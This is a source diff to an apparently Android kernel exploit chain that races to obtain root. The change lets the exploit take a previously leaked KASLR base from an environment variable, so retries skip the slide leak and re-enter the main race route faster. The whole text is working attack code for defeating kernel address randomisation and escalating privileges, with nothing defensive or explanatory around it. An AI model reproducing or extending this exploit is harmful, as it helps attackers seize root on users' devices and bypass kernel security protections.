@@ -170,12 +170,42 @@ void run_main_route_threads(void) {
 }
 
 /*
+ * Reuse the KASLR base that the app verified in an earlier process.  The
+ * address is stable until reboot; repeating the slide on every 6.6 retry
+ * needlessly re-enters the riskiest race.  Invalid input is ignored so the
+ * first process still takes the normal slide path.
+ */
+static int load_supplied_kaslr_base(void) {
+  const char *raw = getenv("KASLR_BASE");
+  if (!raw || !*raw) {
+    return 0;
+  }
+
+  errno = 0;
+  char *end = NULL;
+  uint64_t base = strtoull(raw, &end, 0);
+  if (errno != 0 || end == raw || *end != '\0' ||
+      base < KIMAGE_TEXT_BASE || !is_kernel_ptr((uintptr_t)base)) {
+    pr_warning("ignoring invalid supplied KASLR base=%s\n", raw);
+    return 0;
+  }
+
+  kaslr_base = base;
+  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  pr_success("kaslr supplied pid=%d base=%016llx slide=%016llx "
+             "(slide route skipped)\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide);
+  return 1;
+}
+
+/*
  * Whole exploit chain, single attempt, in a pristine process (forked by
  * run_exploit). Returns 1 on root obtained (root_child_done), 0 otherwise.
- * Each attempt re-does slide + main route; the 6.6 route outcome is
- * decided per run (all 26 pselect attempts can miss), so retrying with a
- * fresh process mirrors the proven manual retry without any leftover
- * thread/futex state.
+ * The 6.6 route outcome is decided per run (all 26 pselect attempts can
+ * miss), so retrying with a fresh process mirrors the proven manual retry
+ * without any leftover thread/futex state.
  */
 static int run_exploit_once(void) {
   disable_rseq_for_thread();
@@ -185,9 +215,11 @@ static int run_exploit_once(void) {
   init_ashmem_path();
 
   pin_to_core(CORE);
-  if (!slide_leak_kernel_base()) {
-    pr_error("slide kaslr leak failed\n");
-    return 0;
+  if (!load_supplied_kaslr_base()) {
+    if (!slide_leak_kernel_base()) {
+      pr_error("slide kaslr leak failed\n");
+      return 0;
+    }
   }
 
   pin_to_core(CORE);
